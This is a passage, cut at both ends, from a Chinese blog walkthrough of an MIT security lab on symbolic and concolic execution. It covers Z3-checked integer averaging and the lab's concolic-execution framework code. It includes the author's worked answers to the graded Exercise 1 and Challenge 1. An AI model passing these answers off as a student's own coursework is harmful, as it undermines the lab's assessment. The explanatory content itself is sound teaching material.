class="hljs-number">32</span>)<br></code></pre></td></tr></table></figure><p>接下来分别计算有&#x2F;无符号除法下两数的平均值，注意这里<strong>并没有实际进行计算，而仅是保存了符号变量表达式</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Compute the average of a and b.  The initial computation we provided</span><br><span class="hljs-comment">## naively adds them and divides by two, but that is not correct.  Modify</span><br><span class="hljs-comment">## these lines to implement your solution for both unsigned (u_avg) and</span><br><span class="hljs-comment">## signed (s_avg) division.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Watch out for the difference between signed and unsigned integer</span><br><span class="hljs-comment">## operations.  For example, the Z3 expression (x/2) performs signed</span><br><span class="hljs-comment">## division, meaning it treats the 32-bit value as a signed integer.</span><br><span class="hljs-comment">## Similarly, (x&gt;&gt;16) shifts x by 16 bits to the right, treating it</span><br><span class="hljs-comment">## as a signed integer.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Use z3.UDiv(x, y) for unsigned division of x by y.</span><br><span class="hljs-comment">## Use z3.LShR(x, y) for unsigned (logical) right shift of x by y bits.</span><br>u_avg = z3.UDiv(a + b, <span class="hljs-number">2</span>)<br>s_avg = (a + b) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>由于 32 位整数加法可能存在溢出，故这里为了求得其正确的平均值，我们将其扩展为两个 33 位的位向量，完成计算后再截断回 32 位（不会导致结果错误，因为 32 位的平均值总会在 32 位内）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Do not change the code below.</span><br><br><span class="hljs-comment">## To compute the reference answers, we extend both a and b by one</span><br><span class="hljs-comment">## more bit (to 33 bits), add them, divide by two, and shrink back</span><br><span class="hljs-comment">## down to 32 bits.  You are not allowed to &quot;cheat&quot; in this way in</span><br><span class="hljs-comment">## your answer.</span><br>az33 = z3.ZeroExt(<span class="hljs-number">1</span>, a)<br>bz33 = z3.ZeroExt(<span class="hljs-number">1</span>, b)<br>real_u_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, z3.UDiv(az33 + bz33, <span class="hljs-number">2</span>))<br><br>as33 = z3.SignExt(<span class="hljs-number">1</span>, a)<br>bs33 = z3.SignExt(<span class="hljs-number">1</span>, b)<br>real_s_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, (as33 + bs33) / <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>最后就是求解是否存在能够发生整型溢出的约束，即：是否存在这样的两个 32 位整型变量值使得其 32 位下运算结果不与真实计算结果相等：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_val</span>(<span class="hljs-params">v, signed</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(v) == z3.BitVecNumRef:<br>        <span class="hljs-keyword">if</span> signed:<br>            v = v.as_signed_long()<br>        <span class="hljs-keyword">else</span>:<br>            v = v.as_long()<br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_model</span>(<span class="hljs-params">m, signed</span>):<br>    vals = &#123;&#125;<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> m:<br>        vals[k] = printable_val(m[k], signed)<br>    <span class="hljs-keyword">return</span> vals<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_check</span>(<span class="hljs-params">msg, signed, avg, real_avg</span>):<br>    e = (avg != real_avg)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Checking&quot;</span>, msg, <span class="hljs-string">&quot;using Z3 expression:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;    &quot;</span> + <span class="hljs-built_in">str</span>(e).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\n    &quot;</span>))<br>    solver = z3.Solver()<br>    solver.add(e)<br>    ok = solver.check()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Answer for %s: %s&quot;</span> % (msg, ok))<br><br>    <span class="hljs-keyword">if</span> ok == z3.sat:<br>        m = solver.model()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Example:&quot;</span>, printable_model(m, signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Your average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(avg), signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Real average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(real_avg), signed))<br></code></pre></td></tr></table></figure><p>结果如下，Z3 求解器帮助我们找到了这样的值：</p><p><img src="https://s2.loli.net/2022/12/12/LekmYMWvfAUSNwy.png" alt="image.png"></p><p>接下来是 Exercise 1：通过修改  <code>int-avg.py</code> 中的 <code>u_avg = ...</code> 一行，实现一个正确的函数，以在 32 位运算下正确计算出 a 与 b 的无符号平均值，不能改变操作数的位宽</p><blockquote><p><strong>Exercise 1.</strong> Implement a correct function to compute the unsigned average of <code>a</code> and <code>b</code> using only 32-bit arithmetic, by modifying the <code>u_avg = ...</code> line in <code>int-avg.py</code>.</p><p>For the purposes of this exercise, you are not allowed to change the bit-widths of your operands. This is meant to represent the real world, where you cannot just add one more bit to your CPU’s register width.</p><p>You may find it helpful to search online for correct ways to perform fixed-width integer arithmetic. The book <a href="https://web.archive.org/web/20190915025154/http://www.hackersdelight.org/">Hacker’s Delight</a> by Henry S. Warren is a particularly good source of such tricks.</p><p>Check your averaging function by re-running <strong>.&#x2F;int-avg.py</strong> or <strong>make check</strong>. If your implementation is correct, <code>int-avg.py</code> should produce the message <code>Answer for unsigned avg: unsat</code>.</p></blockquote><p>这里笔者给出一个比较笨的解法（毕竟笔者的脑子:  (也想不出啥聪明解法 ）：</p><ul><li><strong><code>(a / 2) + (b / 2) + ((a % 2) + (b % 2)) / 2</code></strong></li></ul><p>这个算法的思路比较简单，最初的出发点就是两数之和的平均值不会超出 2<sup>32</sup>，那么我们只要先将两数分别除以2再相加就不会发生溢出了，但是奇数除以2会丢失 0.5，所以如果两个数都是奇数的话最后的结果会丢掉1，那么这里我们再将其加上即可</p><p>这里需要注意的是 Z3 <strong>默认为带符号运算</strong>，故这里我们应当使用 <code>z3.UDiv()</code> 来进行<strong>无符号</strong>除法运算：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">u_avg = z3.UDiv(a, <span class="hljs-number">2</span>) + z3.UDiv(b, <span class="hljs-number">2</span>) + ((a % <span class="hljs-number">2</span>) + (b % <span class="hljs-number">2</span>)) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>运行 <code>make check</code>，成功通过 Exercise 1：</p><p><img src="https://s2.loli.net/2022/12/12/RhY7t1pxyVSb5eH.png" alt="image.png"></p><p>除了这个算法之外，笔者还了解到有一种算法是利用<strong>位运算</strong>来进行计算：</p><ul><li><code>(a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li></ul><p>这个算法的基本原理是先提取出<strong>公有部分</strong>，再计算<strong>私有部分的平均值</strong>，最后相加即可得到结果；这个算法也能通过 Exercise 1 ，这里就不重复贴图了</p><p>接下来是 Challenge 1：通过修改  <code>int-avg.py</code> 中的 <code>s_avg = ...</code> 一行，实现一个正确的函数，以在 32 位运算下正确计算出 a 与 b 的<strong>有符号平均值</strong></p><blockquote><p><em>Challenge! (optional)</em> For extra credit, figure out how to compute the average of two 32-bit <em>signed</em> values. Modify the <code>s_avg = ...</code> line in <code>int-avg.py</code>, and run <strong>.&#x2F;int-avg.py</strong> or <strong>make check</strong> to check your answer. Keep in mind the direction of rounding: 3&#x2F;2&#x3D;1 and -3&#x2F;2&#x3D;-1, so so the average of 1 and 2 should be 1, and the average of -2 and -1 should be -1.</p><p>As you explore signed arithmetic, you may find it useful to know that Z3 has two different modulo-like operators. The first is signed modulo, which you get by using <code>a % b</code> in the Python Z3 API. Here, the sign of the result follows the sign of the divisor (i.e., <code>b</code>). For example, <code>-5 % 2 = 1</code>. The second is signed remainder, which you get by using <code>z3.SRem(a, b)</code>. Here, the sign of the result follows the sign of the dividend (i.e., <code>a</code>). With the same example inputs, <code>z3.SRem(-5, 2) = -1</code>.</p></blockquote><p>对于带符号值的运算而言，限制在 32 位内的正确计算便没有那么简单了，若我们直接用上面的式子进行计算则很容易被 Z3 找到能导致运算结果错误的例子：</p><p><img src="https://s2.loli.net/2022/12/12/VMQFBdz4eICN9qg.png" alt="image.png"></p><p>为什么在有符号除法下计算出来的结果不一致呢？这是因为在题目中<del>MIT 非常SB地</del>对于正数除法其选择<strong>向下取整</strong>，对于负数除法的截断，其选择的是<strong>向上取整</strong>，但我们的算法是<strong>正数与负数皆向下取整</strong>，因此计算结果就出现了偏差</p><p>由于正数部分没有问题，因此这里我们需要对计算结果为负数的情况进行特殊化处理，<strong>在结果为负数时将向下取整变为向上取整</strong>，因此最后的计算公式如下：</p><ul><li><code>tmp = (a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li><li><code>res = tmp + ((tmp &gt;&gt; 31) &amp; (a ^ b))</code></li></ul><p><strong>首先按照我们原来的公式计算出向下取整的结果，接下来对其符号位进行判断，若为 1 则再判断其私有部分平均值的计算是否发生截断（即私有部分和是否为奇数），若是则说明结果发生了向下取整，此时变为向上取整即可</strong></p><p>由于要对符号位进行判断，所以这里我们使用 <code>z3.LShR()</code> 将初始运算结果作为无符号整型进行右移操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp = (a &amp; b) + ((a ^ b) &gt;&gt; <span class="hljs-number">1</span>)<br>s_avg = tmp + (z3.LShR(tmp, <span class="hljs-number">31</span>) &amp; (a ^ b))<br></code></pre></td></tr></table></figure><p>运行结果如下，成功通过 Challenge 1：</p><p><img src="https://s2.loli.net/2022/12/13/mLWgZvYRqnXSJfx.png" alt="image.png"></p><h2 id="Interlude-what-are-symbolic-and-concolic-execution"><a href="#Interlude-what-are-symbolic-and-concolic-execution" class="headerlink" title="Interlude: what are symbolic and concolic execution?"></a>Interlude: what are symbolic and concolic execution?</h2><p>正如我们前面在 EXE 的论文中所见，符号执行是一种通过观测程序在不同输入下如何表现来进行程序测试的方法，通常而言其目的是为了获得更高的 <strong><a href="https://en.wikipedia.org/wiki/Code_coverage">代码覆盖率</a></strong> （code coverage）或是 <strong>路径覆盖率</strong> （path coverage），在安全中其比传统代码执行更能触发罕见的可能包含漏洞的代码路径</p><p>从更高层次而言，若我们要构建一个符号执行系统，我们需要解决以下几点：</p><ul><li>由于程序包含基于输入的中间值（例如输入两个整型并计算平均值，并存放在一些变量中），我们需要记住输入与这些中间值间的关系，通常这通过允许变量或内存位置有  <em>具体的</em> （concrete，例如 114514 这样的实际值） 或  <em>符号的</em>  （symbolic，例如我们在上一小节构建的符号变量） 值</li><li>我们需要根据输入来确定要执行的控制流分支，这归结于在程序每次发生分支时构建符号约束，在程序选择一些特定分支时描述布尔条件（以程序原有输入的形式）；由于我们持续保存中间值与程序原有输入的间隙，我们并不需要通过原有输入来计算约束，这些约束就像我们在前文中用来寻找整型中漏洞的约束；确定控制流约束非常重要，因为若程序初始时进入了特定分支路径，我们想要知道如何让他走到另一条路径来寻找是否存在漏洞，在 EXE 的论文中使用了一个 C-to-C 的翻译器来在所有的分支上插入他们的代码</li><li>对于每一条上述分支，我们需要决定是否有一个输入能够让程序在一条分支上执行另一条路径（更准确地说，我们考虑整个控制流路径而非单个路径），这帮助我们在程序中寻找可以让我们通过调整输入来影响的控制流条件，所有的符号执行系统都基于 SMT 求解器来完成这些工作</li><li>我们需要确定我们在测试中寻找的是什么，这是我们从程序中确保  <em>不变量</em>  （invariant）来考虑的最佳方法，而符号执行寻找改变这些常量的输入（<del>👴也没咋读明白，可以看实验手册原句</del>）；我们可以寻找的事物之一是<strong>程序崩溃</strong>（crashes，即不变量是  <em>我们的程序不应当崩溃</em>  ），在 C 程序中这非常有意义，因为 crashes 通常指示了代表漏洞的内存损坏，在 Python 这样更高级的语言中在设计上并不存在内存损坏，但我们仍然可以寻找如 Python 代码级的代码注入攻击（例如 <code>eval()</code> ）或是特定于某种应用的影响安全的不变量</li><li>最终，对于给出程序中所有可能执行的控制流路径，我们需要决定该尝试哪条路径，因为路径数量会随着程序规模的增大而快速增长，我们不可能尝试所有的路径，因此符号执行系统通常包含确定哪一条路径更有希望发现破坏不变量的某种  <em>调度器</em>  （scheduler）或  <em>搜索策略</em>  （search strategy），一个简单的搜索策略例子便是尝试未执行过的路径，这代表着更高的代码覆盖率与未被发现的漏洞的存在的可能性</li></ul><p>与符号执行相对的一个选择是  <a href="https://en.wikipedia.org/wiki/Fuzz_testing">fuzzing</a> （又称 fuzz-testing，模糊测试），其选择了一个随机化方案：不同于关注触发应用中不同代码路径的原因，fuzzing 会创建随机的具体值交给程序执行并检查其行为；虽然这比符号执行更简单，但通常很难构造能满足程序代码中一些特定情况的输入</p><p>构建符号执行系统的一个挑战是我们的系统需要知道如何在符号值上执行所有可能的操作（上面的 Step 1 &amp; 2），在本 Lab 中我们将在 Python 对象（更准确地说，整型与字符串）上实践，对于符号执行而言这很有挑战性，因为 Python 对象可以实现的操作有很多</p><p>幸运的是我们还有一个更简单的选择——  <em>混合执行</em>  （<strong>concolic execution</strong>），介于完全随机的模糊测试与完全的符号执行之间，相较于跟踪纯净的符号值（如 EXE 中所做），其思想是：对于从输入中得到的变量，我们可以<strong>同时保存一个具体值与一个符号值</strong>，由此：</p><ul><li>若我们的 concolic system 知道应用的行为，我们可以像符号执行那样运行（除了我们还会同时传播每个值的 concrete 部分）；例如，假设我们有两个 concolic 整型变量 <code>aa</code> 与 <code>bb</code>，其有着具体值 <code>5</code> 与 <code>6</code> ，并对应符号表达式 <code>a</code> 与  <code>b</code>，此时若应用创建了一个变量 <code>cc = aa + bb</code>，其会同时有着具体值 <code>11</code> 及符号表达式 <code>a + b</code>；类似地，若应用在 <code>cc == 12</code> 的分支上执行，程序可以像分支为假一样执行，并记录对应的符号分支条件 <code>a + b != 12</code></li><li>若我们的 concolic system 不知道应用的当前行为，应用将只会得到具体的值；例如若应用将 <code>cc</code> 写入文件中，或者是传递到外部库中，代码仍可以使用具体值 <code>11</code> 如同应用正常运行那样继续执行</li></ul><p>对于本 lab 而言，混合执行的好处是我们并不需要完全完成对符号值的操作支持，我们只需要支持足够发现漏洞的操作即可（实际上大部分挖洞系统也是如此），不过若应用执行了我们所不支持的操作，我们将失去对符号部分的跟踪，并无法对这些路径进行符号执行式的（symbolic-execution-style）探索，若想了解更多可以参见  <a href="http://css.csail.mit.edu/6.858/2022/readings/dart.pdf">DART paper</a> </p><h2 id="Concolic-execution-for-integers"><a href="#Concolic-execution-for-integers" class="headerlink" title="Concolic execution for integers"></a>Concolic execution for integers</h2><p>首先我们将为整型值构建一个混合执行系统，本 Lab 为我们的混合执行提供的框架代码位于 <code>symex/fuzzy.py</code> 中，其实现了几个重要的抽象层：</p><ul><li><p><strong>抽象语法树</strong>（The AST）：与此前我们在 <code>int-avg.py</code> 中使用 Z3 表达式来表示符号值所不同的是，本 Lab 构建了其自己的抽象语法树（abstract syntax tree）来表达符号表达式，一个 AST 节点可以是一个简单的变量（ <code>sym_str</code> 或 <code>sym_int</code> 对象）、一个常量（<code>const_int</code>、<code>const_str</code> 或 <code>const_bool</code> 对象）、或是一些将其他 AST 节点作为参数的函数或操作符（例如 <code>sym_eq(a, b)</code> 表示布尔表达式 <code>a==b</code>，其中 <code>a</code> 与 <code>b</code> 都是 AST 节点，或是 <code>sym_plus(a, b)</code> 表示整型表达式 <code>a + b</code>）</p><p>每个 AST 节点 <code>n</code> 都可以使用 <code>z3expr(n)</code> 转化为 Z3 表达式，这由调用 <code>n._z3expr</code> 完成，即每个 AST 节点都实现了返回对应 Z3 表达式的 <code>_z3expr</code> 方法</p><p>我们使用自己的 AST 层而非使用 Z3 的符号表示的原因是因为我们需要实现一些 Z3 表示难以完成的操作，此外我们需要分出一个独立的进程来调用 Z3 的求解器，以在 Z3 求解器耗时过长时杀死进程——将约束归为不可解（这种情况下我们可能失去这些路径，但至少我们会让程序探索其他路径）；使用我们自己的 AST 能让我们将 Z3 状态完全独立在 fork 出的进程里</p></li><li><p><strong>混合封装</strong>（The concolic wrappers）：为了拦截 python-level 的操作并进行混合执行，我们将常规的 <code>int</code> 与 <code>str</code> 对象替换成了混合的子类：<code>concolic_int</code> 继承自 <code>int</code> 而 <code>concolic_str</code> 继承自 <code>str</code>，每一个混合封装都同时存储一个具体值（<code>self.__v</code> ）与一个符号表达式（与 AST 节点，在 <code>self.__sym</code>），当应用在计算混合值表达式（例如 <code>a+1</code> 中的 <code>a</code> 为 <code>concolic_int</code>），我们需要拦截该操作并返回一个同时包含具体值与符号表达式的的混合值</p><p>为了实现这样的拦截操作，我们重载了 <code>concolic_int</code> 与 <code>concolic_str</code> 类中的一些方法，例如 <code>concolic_int.__add__</code> 在上面的例子 <code>a + 1</code> 中会被调用并返回一个新的混合值表示结果</p><p>原则上我们应该也要有一个 <code>concolic_bool</code> 作为 <code>bool</code> 的子类，不幸的是在 Python 中 <code>bool</code> 不能被继承（参见<a href="https://docs.python.org/3/library/functions.html#bool">这里</a> 与 <a href="https://mail.python.org/pipermail/python-dev/2002-March/020822.html">这里</a>），于是我们创建了函数 <code>concolic_bool</code> 作为代替，当我们创建一个混合布尔值时，程序会按其值进行分支，故 <code>concolic_bool</code> 也会为当前路径条件添加一个约束（布尔值的符号表达式与具体值相等的约束），并返回一个具体的布尔值</p></li><li><p><strong>具体输入</strong>（The concrete inputs）：在混合执行下被测试的程序输入都存储在 <code>concrete_values</code> 字典中，在该字典中存储了程序输入的字符串名字，并将每个名字映射到对应的输入值（整型变量的值为python整型，字符串变量为python字符串）</p><p><code>concrete_value</code> 被设为全局变量的原因是应用通过调用 <code>fuzzy.mk_str(name)</code> 或 <code>fuzzy.mk_int(name)</code> 来创建一个混合字符串或混合整型，其返回一个混合值，其中的符号部分为一个新的 AST 节点对应到一个名为 <code>name</code> 的变量，但具体值被在 <code>concrete_values</code> 中查找，若字典中没有与之关联的变量，系统将其设为默认的初始值（整型为0，字符串为空串）</p><p>混合执行框架在一个 <code>InputQueue</code> 对象中维持一个待尝试的不同输入的队列，框架首先会添加一个初始输入（空字典 <code>&#123;&#125;</code>），之后执行代码，若应用进入了分支，混合执行系统将唤醒 Z3 来带来 新的输入以测试代码中的其他分支，将这些输入放到输入队列中，并保持迭代直到没有输入可以尝试</p></li><li><p><strong>可满足性模理论求解器</strong>（The SMT solver）： <code>fork_and_check(c)</code> 函数会检查约束 <code>c</code> （一个 AST 节点）是否为可满足的表达式，并返回一对值：可满足性状态 <code>ok</code> 及示例模型（分配给变量的值），若约束可以被满足则 <code>ok</code> 为 <code>z3.sat</code> ，若约束不可被满足则 <code>ok</code> 为 <code>z3.unsat</code> 或 <code>z3.unknown</code>；该函数内部会 fork 一个独立的进程来运行 Z3 求解器，若耗时超过 <code>z3_timeout</code> 则杀死进程并返回 <code>z3.unknown</code></p></li><li><p><strong>当前路径条件</strong>（The current path condition）：当应用执行并基于混合值决定控制流时（参见上面关于 <code>concolic_bool</code> 的讨论），表示该分支的约束会被添加到 <code>cur_path_constr</code> 列表中，为了生成能够沿着一条分支从一个点进行不同选择的输入，所需的约束为路径上该点之前的约束集合，加上该点的反向约束；为了帮助调试与启发式搜索，触发了分支的代码行的信息会被存放在 <code>cur_path_constr_callers</code> 列表中</p></li></ul><p>接下来我们的工作是完成对 <code>concolic_int</code> 的实现，并将代码应用于混合执行循环的核心，本 Lab 提供了两个测试程序： <code>check-concolic-int.py</code> 与 <code>check-symex-int.py</code></p><h3 id="混合执行框架代码浅析-Part-1"><a href="#混合执行框架代码浅析-Part-1" class="headerlink" title="混合执行框架代码浅析  - Part 1"></a>混合执行框架代码浅析  - Part 1</h3><p>在做 Exercise 之前，我们先看一下这个混合执行框架的代码结构，其核心代码主要位于 <code>symex/fuzzy.py</code> 中</p><h4 id="I-AST-节点"><a href="#I-AST-节点" class="headerlink" title="I. AST 节点"></a>I. AST 节点</h4><p>首先是 AST 节点，作为所有符号类的父类而存在，定义比较简单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_ast</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(self._z3expr())<br></code></pre></td></tr></table></figure><h4 id="II-符号运算"><a href="#II-符号运算" class="headerlink" title="II. 符号运算"></a>II. 符号运算</h4><p>然后是 <code>sym_func_apply</code> 类，作为所有符号操作的父节点，这里主要重载了 <code>__eq__()</code> 和 <code>__hash__()</code> 方法，用于比较与计算哈希值，比较的方法就是判断是否所有参数相等，哈希值的计算则是所有参数的哈希值进行异或：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_func_apply</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> args:<br>      <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(a, sym_ast):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Passing a non-AST node %s %s as argument to %s&quot;</span> % \<br>                        (a, <span class="hljs-built_in">type</span>(a), <span class="hljs-built_in">type</span>(self)))<br>    self.args = args<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(self) != <span class="hljs-built_in">type</span>(o):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.args) != <span class="hljs-built_in">len</span>(o.args):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(sa == oa <span class="hljs-keyword">for</span> (sa, oa) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.args, o.args))<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> functools.reduce(operator.xor, [<span class="hljs-built_in">hash</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br></code></pre></td></tr></table></figure><p>然后是三个类 <code>sym_unop</code> 、<code>sym_binop</code> 、<code>sym_triop</code>，表示带有1、2、3个操作数的封装，可以使用 <code>a</code> 、<code>b</code> 、<code>c</code> 获得第 1、2、3个操作数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_unop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a</span>):<br>    <span class="hljs-built_in">super</span>(sym_unop, self).__init__(a)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_binop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b</span>):<br>    <span class="hljs-built_in">super</span>(sym_binop, self).__init__(a, b)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_triop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b, c</span>):<br>    <span class="hljs-built_in">super</span>(sym_triop, self).__init__(a, b, c)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><p>基于 <code>sym_func_apply</code> 与 <code>op</code> 类，封装了相等比较、与、或、非四个操作，其实现原理主要还是转成 Z3 表达式后利用 Z3 的与或非进行运算：：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Logic expressions</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_eq</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) == z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_and</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.And(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_or</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title 